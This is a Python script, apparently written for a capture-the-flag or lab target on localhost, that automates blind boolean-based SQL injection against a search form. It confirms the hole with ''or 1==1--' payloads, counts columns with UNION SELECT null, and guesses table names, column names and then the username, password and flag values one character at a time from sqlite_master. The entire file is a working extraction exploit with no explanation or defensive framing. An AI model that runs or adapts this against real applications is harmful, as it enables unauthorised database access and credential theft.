import requests
import re, sys

url = "http://localhost/search"
field = "search_term"
letters = ("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9")

def ping(url, data):
    try:
        resp = requests.post(url, data)
        rText = resp.text

        pattern_user_doesnt_exist = re.compile(r"</form><br><p>User Doesn&#39;t exits.</p><br><br>", re.IGNORECASE)
        pattern_user_exists = re.compile(r"</form><br><p>User exits!</p><br><br>", re.IGNORECASE)


        if resp.status_code == 200:
            if pattern_user_doesnt_exist.search(rText):
                return False
            elif pattern_user_exists.search(rText):
                return True
            else:
                print("Error no Matches found", rText)
                sys.exit()
        else:
            print(f"Error: {resp.status_code}")

    except requests.RequestException as e:
        print(f"Error: {e}")

def basicTest():
    truthy = {field: "'or 1==1--"}
    falsy = {field:"'or 1==2--"}
    if not ping(url, truthy) or ping(url, falsy):
        print("basicTest failed.... exiting!")
        sys.exit()

def colCount():
    run = True
    count=  1
    appended = 0
    appendString = ", null"
    basestring = "' UNION SELECT null"
    postString = " from sqlite_master--"

    while run and count < 10:
        if appended <= count:
            basestring = basestring + appendString
            appended = appended + 1
            if not ping(url, {field: basestring+postString}):
                count = count + 1
            else: 
                count = count + 1
                run = False
        else:
            run = False
    print(f"current table has {count} collumns")
    return count

def ColQueryBuilder(noOfCol, preString):
    colLoop = 0

    while colLoop < noOfCol:
        preString = f"{preString} null,"
        colLoop= colLoop+1
    preString = preString.strip()[:-1]
    return preString

def noOfLetters(preString):
    noOfLetters = 0
    loop = True
    postString = " FROM sqlite_master where type =='table' and length(name) == "
    postString2 = " --"

    while loop and noOfLetters < 15:
        query = preString+postString+str(noOfLetters)+postString2
        if ping(url, {field: query}):
            loop = False
        else:
            noOfLetters = noOfLetters + 1
    print(f" Found {noOfLetters} letters!")
    return noOfLetters

def tableName(noOfCol):
    injection = ""
    letterFound = False
    exit = False
    
    print("Calculating Table Name....")
    if noOfCol > 2:
        while not exit:
            for l in letters:
                CurrentInj = injection + l
                query = f"'  UNION SELECT sql, type, name, NULL FROM sqlite_master where type =='table' and name like '{CurrentInj}%'--"
                if ping(url, {field: query}):
                    injection = injection + l
                    letterFound = True
                    #print(l, end="")
            if not letterFound:
                exit = True
                print()
            else:
                letterFound = False
    return injection

def tableColNames(named_tbl, noOfCol):
    injection = ""
    letterFound = False
    exit = False

    preString = ColQueryBuilder(noOfCol - 1, "'  UNION SELECT name,")

    if noOfCol > 0:
        while not exit:
            for l in letters:
                CurrentInj = injection + l
                query = f"{preString} from pragma_table_info('{named_tbl}') where name like '{CurrentInj}%'--"
                if ping(url, {field: query}):
                    injection = injection + l
                    letterFound = True
                    #print(l)
            if not letterFound:
                exit = True
            else:
                letterFound = False
        return injection
    
def getData(named_tbl, tblColName, noOfCol):
    injection = ""
    letterFound = False
    exit = False

    preString = ColQueryBuilder(noOfCol - 1, f"'  UNION SELECT {tblColName},")

    if noOfCol > 0:
        while not exit:
            for l in letters:
                CurrentInj = injection + l
                query = f"{preString} from '{named_tbl}' where {tblColName} like '{CurrentInj}%'--"
                if ping(url, {field: query}):
                    injection = injection + l
                    letterFound = True
                    print(l, end="")
            if not letterFound:
                exit = True
            else:
                letterFound = False
        return injection



if __name__ == "__main__":
    basicTest()
    noOfCol = colCount()
    colPreString = ColQueryBuilder(noOfCol, "'  UNION SELECT")
    named_tbl = tableName(noOfCol)
    tblColName = tableColNames(named_tbl, noOfCol)
    print(f"{'- '* 25}\nUsername = ", end="")
    getData(named_tbl, "username", noOfCol)
    print(f"\nPassword = ", end="")
    getData(named_tbl, "pass", noOfCol)
    print(f"\nFlag = ", end="")
    getData(named_tbl, "flag", noOfCol)
